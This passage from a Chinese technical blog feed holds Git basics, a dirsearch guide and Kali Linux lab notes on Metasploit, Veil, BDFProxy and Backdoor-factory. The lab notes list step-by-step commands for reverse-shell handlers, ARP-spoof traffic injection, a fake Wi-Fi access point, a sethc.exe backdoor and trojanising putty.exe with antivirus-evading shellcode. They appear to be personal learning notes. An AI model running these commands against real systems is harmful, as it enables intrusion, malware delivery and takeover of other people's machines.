<li>git-demo：为拉取到本地仓库的名称</li>
</ul>
</li>
<li>拉取远端仓库修改数据到本地：<strong><code>🔺命令：git pull origin master</code></strong><ul>
<li>origin：远端仓库名称</li>
<li>master：本地仓库名称</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-Git-tutorial-Repository"><a href="#3-Git-tutorial-Repository" class="headerlink" title="3. Git-tutorial Repository"></a>3. Git-tutorial Repository</h4><ul>
<li>mkdir git-tutorial</li>
<li>cd git-tutorial</li>
<li>git init</li>
<li>ll</li>
<li>touch README.md</li>
<li>git status</li>
<li>git add README.md</li>
<li>git status</li>
<li>git rm –cacahe README.md</li>
<li>git status</li>
<li>git add README.md -A</li>
<li>git status</li>
<li>git commit -m “README.md”</li>
<li>git remote add origin <a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a>..</li>
<li>git remote -v</li>
<li>git push origin master -u</li>
<li>查看Github是否有新建一个仓库并有README.md</li>
<li>cd ..</li>
<li>git clone https://… git-demo</li>
<li>vim README.md</li>
<li>Hello world → wq</li>
<li>git status</li>
<li>git add README.md</li>
<li>git commit -m “modify README.md”</li>
<li>cd ..</li>
<li>cd git-tutorial</li>
<li>git pull origin master</li>
<li>查看Github建立的仓库中的README.md是否有内容</li>
</ul>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Git笔记-1：什么是Git</title>
    <url>/2020/02/20/Git%E7%AC%94%E8%AE%B0-1%EF%BC%9A%E4%BB%80%E4%B9%88%E6%98%AFGit/</url>
    <content><![CDATA[<hr>
<h4 id="1-Git"><a href="#1-Git" class="headerlink" title="1. Git"></a>1. Git</h4><ul>
<li>分布式版本管理系统<ul>
<li>最初是为了管理Linux的系统内核</li>
<li>同FTP相同的功能</li>
<li>非线性管文件</li>
<li>速度快</li>
<li>对待数据更像一个快照流</li>
<li>可以在无网络的情况下进行提交到本地服务器，在有网络的情况下提交给远端的服务器</li>
</ul>
</li>
</ul>
<p>![1-Git-Server and Computer](/images/git/1-Git-Server and Computer.PNG)</p>
<ul>
<li>方式：直接记录快照而非方式，每次修改需要一次Commit</li>
<li>保证完整性：计算校验和（哈希算法），Git存取的是哈希值</li>
</ul>
<p><img src="/images/git/1-Git--Snaphost.PNG" srcset="/img/loading.gif" alt="1-Git--Snaphost"></p>
<p><img src="/images/git/kodex/1-Git--%E5%AE%8C%E6%95%B4%E6%80%A7.PNG" srcset="/img/loading.gif" alt="1-Git--完整性"></p>
<h4 id="2-Git中的数据库"><a href="#2-Git中的数据库" class="headerlink" title="2. Git中的数据库"></a>2. Git中的数据库</h4><ul>
<li>Git仓库–.git directory：保存项目数据，元数据的地方，git自己维护的文件夹</li>
<li>工作目录–Working Directory：内容自Git仓库，对当前项目某一版本独立提取出来的内容</li>
<li>暂存区–Staging Area：保存下次提交的文件目录，也算是一个索引</li>
<li>三个概念<ul>
<li>已提交：Git目录中保存着的特定版本文件</li>
<li>已暂存：做了修改并放在暂存区</li>
<li>已修改：做了修改但还没有放到暂存区</li>
</ul>
</li>
<li>远程仓库–Remote：多人操作的仓库</li>
</ul>
<p><img src="/images/git/1-Git%E4%BB%93%E5%BA%93-1.PNG" srcset="/img/loading.gif" alt="1-Git仓库-1"></p>
<p><img src="/images/git/1-Git%E4%BB%93%E5%BA%93-2.PNG" srcset="/img/loading.gif" alt="1-Git仓库-2"></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透工具(一)：Dirsearch</title>
    <url>/2020/02/18/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7(%E4%B8%80)%EF%BC%9ADirsearch/</url>
    <content><![CDATA[<hr>
<h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h4><ul>
<li>目录爆破工具–dirsearch is a simple command line tool designed to brute force directories and files in websites.</li>
<li>语言：Python3</li>
<li>平台<ul>
<li>Windows XP/7/8/10</li>
<li>GNU/Linux</li>
<li>MacOSX</li>
</ul>
</li>
<li>官方声明特性<ul>
<li>Multithreaded：多线程运行</li>
<li>Keep alive connections：长连接</li>
<li>Support for multiple extensions (-e|–extensions asp,php)：多文件格式</li>
<li>Reporting (plain text, JSON)：报告</li>
<li>Heuristically detects invalid web pages：启发式检测无效的web页面</li>
<li>Recursive brute forcing：递归式暴力破解</li>
<li>HTTP proxy support：http代理支持</li>
<li>User agent randomization：随机的user-agnet</li>
<li>Batch processing：批量处理</li>
<li>Request delaying：请求延时</li>
<li>▲ 可自建字典</li>
</ul>
</li>
<li>下载<ul>
<li>Github地址：<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></li>
<li>git clone <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></li>
<li>cd dirsearch/</li>
<li>./dirsearch.py</li>
</ul>
</li>
<li>注意事项<ul>
<li>不支持除http代理外的其他代理，如sock5</li>
<li>批量处理可能导致服务器拒绝服务，线程数不超过10</li>
</ul>
</li>
</ul>
<h4 id="2-常用参数"><a href="#2-常用参数" class="headerlink" title="2. 常用参数"></a>2. 常用参数</h4><ul>
<li>-h, –help 查看帮助</li>
<li>Mandatory<ul>
<li>-u URL, –url=URL 设置url</li>
<li>-L URLLIST, –url-list=URLLIST 设置url列表</li>
<li>-e EXTENSIONS, –extensions=EXTENSIONS 网站脚本类型</li>
</ul>
</li>
<li>Dictionary Settings<ul>
<li>-w WORDLIST, –wordlist=WORDLIST 设置字典</li>
<li>-l, –lowercase 小写</li>
<li>-f, –force-extensions 强制扩展字典里的每个词条</li>
</ul>
</li>
<li>General Settings<ul>
<li>-s DELAY, –delay=DELAY 设置请求之间的延时</li>
<li>-r, –recursive Bruteforce recursively 递归扫描</li>
<li>-t THREADSCOUNT, –threads=THREADSCOUNT 设置扫描线程</li>
<li>-x EXCLUDESTATUSCODES, –exclude-status=EXCLUDESTATUSCODES 排除指定的网站状态码（用逗号隔开）</li>
<li>-c COOKIE, –cookie=COOKIE 设置cookie</li>
<li>–ua=USERAGENT, –user-agent=USERAGENT 设置用户代理</li>
<li>-F, –follow-redirects 跟随地址重定向扫描</li>
<li>-H HEADERS, –header=HEADERS 设置请求头（Referer等）</li>
<li>–random-agents, –random-user-agents 设置随机代理</li>
</ul>
</li>
<li>Connection Settings<ul>
<li>–timeout=TIMEOUT 设置超时时间</li>
<li>–ip=IP 设置域名解析的IP地址</li>
<li>–proxy=HTTPPROXY, –http-proxy=HTTPPROXY 设置http代理（例如localhost:8080）<br>–max-retries=MAXRETRIES 设置最大的重试次数</li>
</ul>
</li>
<li>Report<ul>
<li>–simple-report=SIMPLEOUTPUTFILE 保存结果，发现的路径</li>
<li>–plain-text-report=PLAINTEXTOUTPUTFILE 保存结果，发现的路径和状态码</li>
<li>–json-report=JSONOUTPUTFILE 以json格式保存结果</li>
</ul>
</li>
</ul>
<p><img src="http://118.31.72.36:8088/kodex/index.php?user/publicLink&fid=e70bHizQBVCMS-0AX_2F2JTTtkS3BeqWQPWwpZyV6rLDwRZ_YzX0yWtLWv6Zw0E_FNYF8ryptheJ2bmD1oPOxmZdhqhAOLb81lAEJmuLUORzClwIjShTVfZS4ebwk9yOQ99s0oknHg&file_name=/dirsearch.PNG" srcset="/img/loading.gif" alt="dirsearch"></p>
]]></content>
      <categories>
        <category>渗透工具</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>目录爆破</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(九十七)：Metasploit Framework</title>
    <url>/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%83)%EF%BC%9AMetasploit%20Framework/</url>
    <content><![CDATA[<hr>
<h4 id="1-Metasploit简介"><a href="#1-Metasploit简介" class="headerlink" title="1. Metasploit简介"></a>1. Metasploit简介</h4><ul>
<li>目前最流行、最强大、最具扩展性的渗透测试平台软件</li>
<li>基于Metasploit进行渗透测试和漏洞分析的流程和方法</li>
<li>2003年由HD More发布第一版，2007年用ruby语言重写<ul>
<li>框架继承了渗透测试标准（PETS）思想</li>
<li>一定程度上统一了渗透测试和漏洞研究的工作环境</li>
<li>新的攻击代码可以比较容易的加入框架</li>
</ul>
</li>
<li>开发活跃版本更新频繁（每周）<ul>
<li>早期版本基于社区力量维护，被Rapid 7收购后打造出其商业版产品</li>
<li>目前分化为四个版本，社区版本依然十分活跃</li>
<li>HD More说：为Metasploit写书是种自虐！</li>
<li>2014年之后市场上没有再出现新的Metasploit教材</li>
</ul>
</li>
<li>MSF默认集成与Kali Linux之中</li>
<li>使用postgresql数据库存储数据<ul>
<li>早期版本需要先启动数据库再启动msf</li>
</ul>
</li>
</ul>
<h4 id="2-Offensive-security出版的Metasploit教材"><a href="#2-Offensive-security出版的Metasploit教材" class="headerlink" title="2. Offensive security出版的Metasploit教材"></a>2. Offensive security出版的Metasploit教材</h4><ul>
<li>被HD More称之为当时最好的Metasploit教材（2011/2012）</li>
</ul>
<p><img src="/images/kali/kali-notepad/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97%E4%B8%AD%E6%96%87%E7%89%88.PNG" srcset="/img/loading.gif" alt="Metasploit渗透测试指南中文版"></p>
<p><img src="/images/kali/kali-notepad/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97%E8%8B%B1%E6%96%87%E7%89%88.PNG" srcset="/img/loading.gif" alt="Metasploit渗透测试指南英文版"></p>
<h4 id="3-版本对比"><a href="#3-版本对比" class="headerlink" title="3. 版本对比"></a>3. 版本对比</h4><ul>
<li>Pro版是企业级全功能的高级渗透测试平台</li>
</ul>
<p><img src="/images/kali/kali-notepad/Metasploit%E7%89%88%E6%9C%AC%E5%AF%B9%E6%AF%94.PNG" srcset="/img/loading.gif" alt="Metasploit版本对比"></p>
<h4 id="4-MSF架构"><a href="#4-MSF架构" class="headerlink" title="4. MSF架构"></a>4. MSF架构</h4><p><img src="/images/kali/kali-notepad/MSF%E6%9E%B6%E6%9E%84.PNG" srcset="/img/loading.gif" alt="MSF架构"></p>
<ul>
<li>Rex<ul>
<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
<li>处理socket连接访问、协议应答（http/SSL/SMB等）</li>
<li>编码转换（XOR、Base64、Unicode）</li>
</ul>
</li>
<li>Msf::Core<ul>
<li>提供Msf的核心基本API，是框架的核心能力实现库</li>
</ul>
</li>
<li>Msf::Base<ul>
<li>提供友好的API接口，便于模块调用的库</li>
</ul>
</li>
<li>Plugin插件<ul>
<li>连接和调用外部扩展功能和系统</li>
</ul>
</li>
</ul>
<h4 id="5-MSF模块"><a href="#5-MSF模块" class="headerlink" title="5. MSF模块"></a>5. MSF模块</h4><ul>
<li>/usr/share/metasploit-framework/modules/</li>
<li>技术功能模块（非流程模块）<ul>
<li>Exploit：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
<li>Payload：成功exploit之后，真正在目标系统执行的代码或指令<ul>
<li>Shellcode或系统命令</li>
<li>三种Payload：/usr/share/metasploit-framework/modules/payloads/</li>
<li>Single：all-in-one</li>
<li>Stager：目标计算机内存有限时，先传输一个较小的payload用于建立连接</li>
<li>Stagers：利用stager建立的连接下载的后续payload</li>
<li>Stager、Stagers都有多种类型，适用于不同场景</li>
<li>Shellcode是payload的一种，由于其建立正向/反向shell而得名</li>
</ul>
</li>
<li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有payload的exploit模块）</li>
<li>Encoders：对payload进行加密，躲避AV检查的模块</li>
<li>Nops：提高payload稳定性及维持大小</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(九十六)：Veil-Catapult</title>
    <url>/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%85%AD)%EF%BC%9AVeil-Catapult/</url>
    <content><![CDATA[<hr>
<h4 id="1-Veil-catapult"><a href="#1-Veil-catapult" class="headerlink" title="1. Veil-catapult"></a>1. Veil-catapult</h4><ul>
<li>Payload的投递<ul>
<li>集成veil-evasion生成免杀payload或自定义payload</li>
<li>使用Impacket上传二进制payload文件（前提需要有一个账号密码）</li>
<li>使用passing-the-hass出发执行payload</li>
</ul>
</li>
<li>Payload直接在内存中运行（类似于SMBexec）<ul>
<li>不向硬盘写入payload文件，避免文件型病毒查杀软件</li>
</ul>
</li>
<li>▲ 2020.2.17 依赖Veil-catapult</li>
<li>▲ Github地址：<a href="https://github.com/Veil-Framework/Veil-Catapult" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil-Catapult</a></li>
</ul>
<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window 7（需要有powershell）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看网络连接，关闭防火墙</li>
<li><strong><code>🔺命令：cmd → powershell</code></strong>尝试能否开启powershell</li>
<li>抓包查看是否有数据到本地电脑</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：vi /etc/veil/settings.py</code></strong> → SPAWN_CATAPULT_HANDLER=”true”（默认情况下是投放完payload不开启msf，对EXE delivery起作用，对Standalone payloads不起作用）</li>
<li><strong><code>🔺命令：msfconsole</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handler/</code></strong>（使用控制台）</li>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong>（设置payload）</li>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：set lhost 本机的IP</code></strong>（监听IP）</li>
<li><strong><code>🔺命令：set lport 4444</code></strong>（监听端口4444）</li>
<li><strong><code>🔺命令：set EXITFUNC thread</code></strong>（以线程的方式执行）</li>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong>（执行）</li>
<li><strong><code>🔺命令：session -l</code></strong>（查看session）</li>
<li><strong><code>🔺命令：session -i 1</code></strong>（选择的session1）→ <strong><code>🔺命令：getuid/getpid</code></strong></li>
</ul>
</li>
<li>veil-catapult<ul>
<li>Standalone payloads</li>
<li>EXE delivery</li>
</ul>
</li>
<li>Standalone payloads<ul>
<li>⭐Powershell injector（投放两个脚本+一个powershell指令，适用于Win7及以上版本）</li>
<li>⭐Barebones python injector（同Powershell injector相同原理，适用于Powershell injector注入失败情况下）</li>
<li>⭐Sethc backdoor（用cmd.exe替换C:\Windows\System32\sethc.exe，Sethc为连按shift五次的粘滞键程序，一般可通过物理接触）</li>
<li>⭐Execute custom command </li>
</ul>
</li>
</ul>
</li>
<li>Window 7（需要有powershell）<ul>
<li>任务管理器查看注入的进程（通过pid）</li>
<li>Kali执行完Sethc backdoor后，在登陆界面连按shift五次，修改win7密码</li>
<li>重启挂载Kali硬盘<ul>
<li><strong><code>🔺命令：fdisk -l</code></strong>查看挂载的硬盘</li>
<li><strong><code>🔺命令：mount /dev/sda2（大文件硬盘）/mnt</code></strong></li>
<li><strong><code>🔺命令：cd /mnt/Windows/System32</code></strong></li>
<li><strong><code>🔺命令：mv sethc.exe sethc.exe.old</code></strong></li>
<li><strong><code>🔺命令：cp cmd.exe sethc.exe</code></strong></li>
<li>拔出光盘，<strong><code>🔺命令：reboot</code></strong></li>
</ul>
</li>
<li>还原快照</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/cmd%E6%9B%BF%E6%8D%A2sethc.PNG" srcset="/img/loading.gif" alt="cmd替换sethc"></p>
<ul>
<li>Kali<ul>
<li>开启Wireshark抓包，抓取ping的rely包</li>
<li>Standalone payloads<ul>
<li>Execute custom command（执行子命令）</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(九十五)：Veil-Evasion</title>
    <url>/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%BA%94)%EF%BC%9AVeil-Evasion/</url>
    <content><![CDATA[<hr>
<h4 id="1-Veil-evasion"><a href="#1-Veil-evasion" class="headerlink" title="1. Veil-evasion"></a>1. Veil-evasion</h4><ul>
<li>▲ 无病毒体的文件：向window的注册表写入病毒体/向硬件写入病毒体</li>
<li>属于Veil-framework框架的一部分</li>
<li>由python语言编写</li>
<li>用于自动生成免杀payload<ul>
<li>集成msf payload，支持自定义payload</li>
<li>集成各种注入技术（系统进程）</li>
<li>集成各种第三方工具<ul>
<li>Hypersion、PEScrambler、BackDoor Factory</li>
</ul>
</li>
<li>集成各种开发打包运行环境<ul>
<li>Python：pyinstaller/py2exe</li>
<li>C#：mono for.NET</li>
<li>C：mingw32<ul>
<li>▲ 2020.2.17 安装依赖包的时候发生错误，从Github上下载也存在错误</li>
<li>▲ Veil-evasion改名集成于Veil-Framework</li>
<li>▲ 从Github下载的包，在PyInstaller生成EXE文件时无法生成文件</li>
<li>▲ Github地址：<a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-Veil-evasion–Kali"><a href="#2-Veil-evasion–Kali" class="headerlink" title="2. Veil-evasion–Kali"></a>2. Veil-evasion–Kali</h4><ul>
<li><strong><code>🔺命令：apt-get install veil-evasion</code></strong>（安装Veil-evasion）</li>
<li><strong><code>🔺命令：veil-evasion yes</code></strong>（安装脚本安装）<ul>
<li>python</li>
<li>pywin32</li>
<li>pycrypto</li>
<li>Ruby（三个选项勾选）</li>
<li>Go</li>
</ul>
</li>
<li><strong><code>🔺命令：update</code></strong>（升级）</li>
<li><strong><code>🔺命令：list</code></strong>（集成的pyloads，生成的shellcode默认放在/var/lib/veil-evasion/output）<ul>
<li><strong><code>🔺命令：35</code></strong>（python/shell_inject/aes_encrypt，未加密USE_PYHERION → N）</li>
<li><strong><code>🔺命令：35</code></strong>（python/shell_inject/aes_encrypt，加密USE_PYHERION → Y）</li>
<li>查看两个shell的免杀效果（查杀网站）</li>
</ul>
</li>
<li>▲ /var/lib/veil-evasion/output/handles（可运行在msf上的配置文件）</li>
<li><strong><code>🔺命令：msfconsole -r</code></strong> 具体配置文件路径<ul>
<li><strong><code>🔺命令：jobs</code></strong>（查看运行的任务）</li>
<li><strong><code>🔺命令：sessions</code></strong>（查看运行的session）<ul>
<li><strong><code>🔺命令：session -i 1</code></strong>（进行交互shell）</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(九十四)：BDFProxy</title>
    <url>/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%9B%9B)%EF%BC%9ABDFProxy/</url>
    <content><![CDATA[<hr>
<h4 id="1-Bdfproxy"><a href="#1-Bdfproxy" class="headerlink" title="1. Bdfproxy"></a>1. Bdfproxy</h4><ul>
<li>Bdfproxy(mitmproxy)<ul>
<li>基于流量劫持动态注入shellcode（ARP spoof、DNS spoof、Fake AP）</li>
</ul>
</li>
<li>补充内容<ul>
<li>全站HTTPS防注入（微软每个补丁都带马）</li>
<li>PE文件证书签名可被清除</li>
<li>PE Header -&gt; Optional Header -&gt; Certificate Table（Address and size）<ul>
<li>全部用0覆盖</li>
<li>BDF默认清除数字签名</li>
</ul>
</li>
</ul>
</li>
<li><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">https://live.sysinternals.com/</a></li>
<li>▲ 2020.2.15 BDFProxy已不再受支持</li>
<li>▲ 2020.2.15 BDFProxy的链接<a href="https://github.com/secretsquirrel/BDFProxy.git" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy.git</a></li>
<li>▲ 2020.2.15 BDFProxy的模块导入存在问题</li>
</ul>
<p>![Josh and Mark Russionovich](/images/kali/kali-notepad/Josh and Mark Russionovich.PNG)</p>
<h4 id="2-bdfproxy–ARP-spoof"><a href="#2-bdfproxy–ARP-spoof" class="headerlink" title="2. bdfproxy–ARP spoof"></a>2. bdfproxy–ARP spoof</h4><ul>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：apt-get install mitmproxy,backdoor-factory,bdfproxy</code></strong></li>
<li><strong><code>🔺命令：sysctl -w net.ipv4.ip_forward=1</code></strong> </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 80/443 -j REDIRECT --to-ports 8080</code></strong></li>
<li><strong><code>🔺命令：iptables -L</code></strong>（查看防火墙转发规则）</li>
<li><strong><code>🔺命令：vi /etc/bdfproxy/bdfproxy.cfg</code></strong> <ul>
<li>proxyMode = transparent</li>
<li>HOST = Kali的IP（所有的HOST需要修改）</li>
</ul>
</li>
<li><strong><code>🔺命令：bdfproxy</code></strong>（生成一个rc文件）</li>
<li><strong><code>🔺命令：msfdb init</code></strong></li>
<li><strong><code>🔺命令：msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</code></strong><ul>
<li><strong><code>🔺命令：jobs</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：arpspoof -i eth0 -t Window7的IP Kali的IP</code></strong></li>
</ul>
</li>
<li>Window 7<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ipconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：arp -a</code></strong>查看网关MAC地址</li>
<li>在Kali欺骗之后，再次<strong><code>🔺命令：arp -a</code></strong>查看MAC地址</li>
<li>网页访问Putty官网下载putty</li>
<li>双击下载的putty</li>
</ul>
</li>
<li>Kali<ul>
<li>查看流量日志是否注入成功</li>
<li>在win7开启putty后，是否有反弹的shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：shell</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-bdfproxy–Fack-AP"><a href="#3-bdfproxy–Fack-AP" class="headerlink" title="3. bdfproxy–Fack AP"></a>3. bdfproxy–Fack AP</h4><ul>
<li>▲ 2020.2.15 因无无线网卡，此实验暂无完成</li>
<li>Mana创建Fack AP</li>
<li>Bdfproxy代理注入代码</li>
<li>Msf侦听反弹shell</li>
<li>Kali<ul>
<li><strong><code>🔺命令：apt-get install mana-toolkit</code></strong></li>
<li><strong><code>🔺命令：reboot</code></strong> </li>
<li><strong><code>🔺命令：vi /etc/mana-toolkit/hostapd-mana.conf</code></strong><ul>
<li>修改无线SSID名称 → kfc-free</li>
</ul>
</li>
<li><strong><code>🔺命令：./usr/share/mana-toolkit/run-mana/start-nat-simple.sh</code></strong><ul>
<li>▲ 需要插无线网卡</li>
<li>修改phy的名称为插入的无线网卡设备号名称</li>
<li>清空iptables的规则</li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80/443 -j REDIRECT --to-port 8080</code></strong></li>
<li><strong><code>🔺命令：./mana.sh</code></strong>（可能需要多次重启）</li>
</ul>
</li>
<li><strong><code>🔺命令：vi /etc/bdfproxy/bdfproxy.cfg</code></strong> <ul>
<li>proxyMode = transparent</li>
<li>HOST = Kali的IP（所有的HOST需要修改）</li>
</ul>
</li>
<li><strong><code>🔺命令：bdfproxy</code></strong>（生成一个rc文件）</li>
<li><strong><code>🔺命令：msfdb init</code></strong></li>
<li><strong><code>🔺命令：msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</code></strong><ul>
<li><strong><code>🔺命令：jobs</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>安装无线连接驱动（需插入无线网卡），连接wifi（kfc-free）</li>
<li>上网尝试</li>
</ul>
</li>
</ul>
<p>![Fack AP](/images/kali/kali-notepad/Fack AP.PNG)</p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(九十三)：Backdoor-factory</title>
    <url>/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%89)%EF%BC%9ABackdoor-factory/</url>
    <content><![CDATA[<hr>
<h4 id="1-Backdoor-factory"><a href="#1-Backdoor-factory" class="headerlink" title="1. Backdoor-factory"></a>1. Backdoor-factory</h4><ul>
<li>▲ 2020.2.15 Backdoor-factory已不再受支持</li>
<li>▲ 2020.2.15 本机自带的backdoor-factory存在坑，需要从github上下载进行运行</li>
<li>▲ 2020.2.15 Backdoor-factory链接<a href="https://github.com/secretsquirrel/the-backdoor-factory.git" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory.git</a></li>
<li>Patch<ul>
<li>通过替换EXE、DLL、注册表等方法修复系统漏洞或问题的方法</li>
<li>BDF：向二进制文件中增加或者删除代码内容<ul>
<li>某些受保护的二进制程序无法patch</li>
<li>存在一定概率文件会被patch坏掉</li>
</ul>
</li>
</ul>
</li>
<li>后门工厂<ul>
<li>适用于windows PE x32/x64和Linux ELF x32/x64（OSX）</li>
<li>支持msf payload、自定义payload</li>
</ul>
</li>
<li>将shellcode代码patch进模板文件，躲避AV检查</li>
<li>Python语言编写</li>
<li>msf使用的patch方法<ul>
<li>覆盖程序入口<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/reverse_tcp ……</code></strong></li>
</ul>
</li>
<li>创建新的线程执行shellcode并跳回源程序入口<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/reverse_tcp –k</code></strong></li>
<li>增加代码片段跳转执行后跳回源程序入口</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/msf%E4%BD%BF%E7%94%A8%E7%9A%84patch%E6%96%B9%E6%B3%95.PNG" srcset="/img/loading.gif" alt="msf使用的patch方法"></p>
<ul>
<li>CTP方法<ul>
<li>增加新的代码段section，与msf -k方法类似</li>
<li>使用现有的代码裂缝/洞（code cave）存放shellcode<ul>
<li>二进制文件中超过两个字节的连续x00区域（代码片段间区域）</li>
<li>根据统计判断代码洞是编译器在进行编译时造成的，不同的编译器造成的代码洞的大小不同</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：cp which cat</code></strong></li>
<li><strong><code>🔺命令：hexeditor cat</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/%E4%BB%A3%E7%A0%81%E6%B4%9E%E7%A4%BA%E4%BE%8B.PNG" srcset="/img/loading.gif" alt="代码洞示例"></p>
<ul>
<li>单个代码洞大小不足以存放完整的shellcode<ul>
<li>多代码洞跳转（非顺序执行）<ul>
<li>初期免杀率可达100%</li>
</ul>
</li>
<li>结合msf的stager方法</li>
</ul>
</li>
<li>Path选项<ul>
<li>附加代码段</li>
<li>单代码洞注入</li>
<li>多代码洞注入</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/%E4%BB%A3%E7%A0%81%E6%B4%9E%E8%B7%B3%E8%BD%AC.PNG" srcset="/img/loading.gif" alt="代码洞跳转"></p>
<h4 id="2-BDF的使用"><a href="#2-BDF的使用" class="headerlink" title="2. BDF的使用"></a>2. BDF的使用</h4><ul>
<li>参数<ul>
<li>-S（检测文件是否支持注入）</li>
<li>-l（可限定字节数的代码洞）</li>
<li>-H（指定IP地址）</li>
<li>-J（指定端口）</li>
</ul>
</li>
<li>检查二进制文件是否支持代码注入（可使用putty）<ul>
<li><strong><code>🔺命令：backdoor-factory -f putty.exe –S</code></strong></li>
</ul>
</li>
<li>查看cave大小<ul>
<li><strong><code>🔺命令：backdoor-factory -f putty.exe -c</code></strong> </li>
</ul>
</li>
<li>显示可用payload<ul>
<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s show</code></strong></li>
<li>iat_reverse_tcp_stager_threaded（分步骤反弹shell的tcp连接）</li>
</ul>
</li>
<li>免杀效果对比（注入文件大小会发生改变）<ul>
<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</code></strong>（单一代码洞注入）</li>
<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</code></strong>（多代码洞注入）</li>
<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -a -H 192.168.20.8 -P 6666</code></strong>（附加注入）</li>
</ul>
</li>
<li>验证有效性<ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit -j</code></strong></li>
</ul>
</li>
<li>物理主机<ul>
<li>双击putty.exe看是否能正常执行</li>
